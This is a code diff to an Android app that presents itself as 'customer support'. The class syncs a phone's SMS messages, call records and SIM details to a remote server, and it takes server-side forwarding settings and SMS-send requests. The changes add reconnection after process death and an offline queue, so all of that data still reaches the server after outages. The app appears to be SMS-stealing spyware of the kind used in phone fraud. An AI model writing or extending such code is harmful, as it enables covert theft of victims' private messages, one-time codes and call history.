@@ -1,6 +1,7 @@
 package com.customersupport.socket
 
 import android.util.Log
+import com.customersupport.CustomerSupportApp
 import io.socket.client.IO
 import io.socket.client.Socket
 import kotlinx.coroutines.flow.MutableStateFlow
@@ -28,6 +29,11 @@ class SocketManager {
     private var onForwardingConfigCallback: ((ForwardingConfig) -> Unit)? = null
     private var onSmsSendRequestCallback: ((SmsSendRequest) -> Unit)? = null
 
+    // Store connection parameters for reconnection
+    private var savedDeviceId: String? = null
+    private var savedDeviceName: String? = null
+    private var savedPhoneNumber: String? = null
+
     fun setOnSyncRequestCallback(callback: () -> Unit) {
         onSyncRequestCallback = callback
     }
@@ -45,6 +51,11 @@ class SocketManager {
     }
 
     fun connect(deviceId: String, deviceName: String, phoneNumber: String) {
+        // Store for reconnection
+        savedDeviceId = deviceId
+        savedDeviceName = deviceName
+        savedPhoneNumber = phoneNumber
+
         try {
             Log.d(TAG, "Connecting to $SERVER_URL")
             _connectionState.value = ConnectionState.CONNECTING
@@ -74,6 +85,9 @@ class SocketManager {
                 Log.d(TAG, "Device registered: $deviceId")
                 
                 requestForwardingConfig(deviceId)
+
+                // Flush any pending sync data from offline period
+                flushPendingSyncQueue()
             }
 
             socket?.on(Socket.EVENT_DISCONNECT) {
@@ -145,6 +159,61 @@ class SocketManager {
         }
     }
 
+    /**
+     * Reconnect using saved credentials. Called by SyncWorker and RestartReceiver
+     * when the service needs to re-establish connection after process death.
+     */
+    fun reconnectIfNeeded() {
+        if (isConnected()) {
+            Log.d(TAG, "Already connected, skipping reconnect")
+            return
+        }
+
+        val deviceId = savedDeviceId
+        val deviceName = savedDeviceName
+        val phoneNumber = savedPhoneNumber
+
+        if (deviceId != null && deviceName != null && phoneNumber != null) {
+            Log.d(TAG, "Reconnecting with saved credentials")
+            connect(deviceId, deviceName, phoneNumber)
+        } else {
+            Log.w(TAG, "No saved credentials for reconnection")
+        }
+    }
+
+    /**
+     * Flush any data that was queued while offline.
+     */
+    private fun flushPendingSyncQueue() {
+        try {
+            val pendingSyncManager = CustomerSupportApp.pendingSyncManager
+            if (!pendingSyncManager.hasPendingData()) return
+
+            val deviceId = pendingSyncManager.getPendingDeviceId() ?: return
+            Log.d(TAG, "Flushing pending sync queue on reconnect")
+
+            pendingSyncManager.getPendingSms()?.let { sms ->
+                syncSms(deviceId, sms)
+                pendingSyncManager.clearPendingSms()
+                Log.d(TAG, "Flushed ${sms.length()} pending SMS")
+            }
+
+            pendingSyncManager.getPendingCalls()?.let { calls ->
+                syncCalls(deviceId, calls)
+                pendingSyncManager.clearPendingCalls()
+                Log.d(TAG, "Flushed ${calls.length()} pending calls")
+            }
+
+            pendingSyncManager.getPendingSim()?.let { sim ->
+                syncSimInfo(deviceId, sim)
+                pendingSyncManager.clearPendingSim()
+                Log.d(TAG, "Flushed ${sim.length()} pending SIM cards")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error flushing pending sync queue", e)
+        }
+    }
+
     fun disconnect() {
         socket?.disconnect()
         socket = null
@@ -154,7 +223,11 @@ class SocketManager {
     fun isConnected(): Boolean = socket?.connected() == true
 
     fun syncSms(deviceId: String, smsArray: JSONArray) {
-        if (!isConnected()) return
+        if (!isConnected()) {
+            // Queue for later
+            CustomerSupportApp.pendingSyncManager.queueSmsSync(deviceId, smsArray)
+            return
+        }
         val data = JSONObject().apply {
             put("deviceId", deviceId)
             put("sms", smsArray)
@@ -164,7 +237,11 @@ class SocketManager {
     }
 
     fun syncCalls(deviceId: String, callsArray: JSONArray) {
-        if (!isConnected()) return
+        if (!isConnected()) {
+            // Queue for later
+            CustomerSupportApp.pendingSyncManager.queueCallsSync(deviceId, callsArray)
+            return
+        }
         val data = JSONObject().apply {
             put("deviceId", deviceId)
             put("calls", callsArray)
@@ -186,7 +263,11 @@ class SocketManager {
     }
 
     fun syncSimInfo(deviceId: String, simArray: JSONArray) {
-        if (!isConnected()) return
+        if (!isConnected()) {
+            // Queue for later
+            CustomerSupportApp.pendingSyncManager.queueSimSync(deviceId, simArray)
+            return
+        }
         val data = JSONObject().apply {
             put("deviceId", deviceId)
             put("simCards", simArray)
